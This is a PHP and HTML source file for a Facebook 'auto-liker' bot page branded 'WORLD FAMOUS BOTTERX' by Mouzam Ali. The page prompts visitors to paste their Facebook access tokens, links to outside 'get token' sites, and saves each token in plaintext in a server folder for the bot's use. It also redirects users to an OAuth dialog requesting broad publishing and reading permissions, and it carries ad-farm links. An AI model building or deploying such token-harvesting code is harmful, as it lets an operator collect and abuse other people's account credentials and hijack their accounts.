<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>MOUZAM ALI</title>
<meta name="keywords" content="#" />
<meta name="description" content="#" />
<!--
Template 2058 metallic slider 
http://www.tooplate.com/view/2058-metallic-slider
-->
<link href="style.css" rel="stylesheet" type="text/css" />
<script src="snow.js"></script>
<font size="30" color="red"><center>⚔</font><font face="Orbitron" size="50" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.2em red, 0pt 2pt 0.2em red;"><b>❤✆WORLD FAMOUS BOTTERX❤</b></font><font size="30" color="Red">⚔</center></font></h3>
		<center>
			<a target="_blank"  href="https://www.facebook.com/100003995456213"><img src="https://graph.facebook.com/100003995456213/picture?width=200" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="100" height="100" title=""/></a></div>
				</center>
			<center><font size="3"></head><body><div style="DriftType: Courgette;font-size: 35pt;text-shadow: 0 0 11px #000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><center><font face="Courgette" size="6" id="r3">
<marquee behavior="scroll" direction="left" scrollamount="15" scrolldelay="1"><strong>❤✆CONTACT ➺FOR SHOOT ❤ ❤ +923248472397 ❤</font></strong></center></marquee></script></div></center></b>
<script type="text/javascript">var r3=document.getElementById("r3");
var myRainbowSpan2=new RainbowSpan(r3, 0, 360, 255, 50, 348); 
myRainbowSpan2.timer=window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed);
</script>
</center>
<style>@font-face {font-family: aryanfonts;src: url(fonts/aa.ttf);}</style>
<script type="text/javascript">
	$().ready(function() {  
		$('.kwicks').kwicks({  
			max : 696,  
			spacing : 0,  
			sticky: true,
		});  
	}); 
</script>

<link rel="stylesheet" href="css/slimbox2.css" type="text/css" media="screen" /> 
<style>
html {
  background: url(http://i.imgur.com/Xyq76xd.jpg) no-repeat center center fixed ;
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.button {
    
    border: none;
    border-radius: 30px;
    color: white;
    width: 140px;
    height: 35px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    -webkit-transition-duration: 0.4s; /* Safari */
    transition-duration: 0.4s;
    cursor: pointer;
}
.button5 {
    background-color:#434351;
    border: 2px solid white;
    border-radius: 50px;
    color: white;
    width: 180px;
    height: 40px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    -webkit-transition-duration: 0.4s; /* Safari */
    transition-duration: 0.4s;
    cursor: pointer;

}

.button5:hover {
    background-color:#040404;
    color:white;
    border: px solid #434351 ;
}


</style>
</head>

<?php 

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$specialbot[]=$b.'='.$c;
}
	$true='?'.implode('&',$specialbot);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY -=[ MOUZAM ALI ]=-',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('specialbot')){

        mkdir('specialbot');
}

if($bb){

	$blue=fopen('specialbot/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('specialbot/'.$id)){

	$file=file_get_contents(specialbot);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('specialbot/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('specialbot/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('specialbot/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('specialbot/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('specialbot/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('specialbot/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="bottom-content">
<div id="navigation-menu">
<center><a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a></center>
</div><br/>
<center><br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<span>User name :<b>'.$nm.'</b><br></span>
<span>User ID :<b>' . $id . '</b><br></span>

<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="btn btn-block btn-danger" type="submit" value="Activate Bot">
</form></center>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
<marquee behavior="scroll" direction="right" scrollamount="20" scrolldelay="6" width="100%">
<b>
<font size="20" color="red">😈😈»</font><a class="sec" href="http://wap4dollar.com/ad/serve.php?id=t6n32w1gx1"><font color="green" size="20">💚ωσяℓ∂ 😉fαмσυѕ😎 вσттєяχ❤️</font></a></b> <font size="20" color="red"></font>
</a>
<a class="sec" href="http://wap4dollar.com/ad/serve.php?id=t6n32w1gx1"><font color="sky blue" size="20"></font></a></b><font size="20" color="red">«😈😈</font></marquee><br />
</td></a></b></marquee><br/>
';
}

public function home(){
echo'
</h2></center></div>
<div id="content">
<div class="post">
';
}

public function bwh(){
echo'
<div id="bottom-content">
<div class="post">
<div class="post-content">
<font face="Chela One" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;">
						⬇GET SPECIAL WORKING TOKEN⬇  <br />
					</font>

<center><br>

<center>
<a href="http://tharkii.tk/" target="_blank">

<input class="button button5" type="button" value="GET TOKEN"></a>

<a href="http://tsndz.pro/gettoken.php" target="_blank">

<input class="button button5" type="button" value="GET TOKEN 2"></a>

<a href="http://wap4dollar.com/ad/serve.php?id=t6n32w1gx1" target="_blank">

<input class="button button5" type="button" value="DOWNLOAD SCRIPT"></a>
</center>
<ul>

<div id="top-content">
<div id="search-form">

<center><form action="index.php" method="post"><input class="inptext inptext1" type="text" placeholder="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Paste Your Token...! " st="" name="token"> <br><input class="button button5" type="submit" value="ACTIVATE BOT"> </form></center></div></div></div>';

$this->membEr();
}

public function membEr(){

	if(!is_dir('specialbot')){

	mkdir('specialbot');
}

$up=opendir('specialbot');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
<center><br>
										<font face="aryanfonts" size="10" color="blue">
											<font style= "text-shadow: 0px 0px 4px rgb(255, 0, 0), 0px 0px 4px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="8">LOVERS <font color="lime">'.count($user).'</font></font>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('specialbot/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('specialbot/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<script type="text/javascript">var r3=document.getElementById("r3");
var myRainbowSpan2=new RainbowSpan(r3, 0, 360, 255, 50, 348); 
myRainbowSpan2.timer=window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed);
</script></span></div><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><div style="text-align:center;" <center>

<img src="http://afzalworld.mobie.in/images/Zdanc_11_15.gif"><center><img
<table align="center" width="98%"><tr><td>

<center><br>
<audio controls="" autoplay="">
  <source src="http://download.mahamp3.com/986/Ijazat%20(Remix)%20-%20128Kbps.mp3">
  </audio>
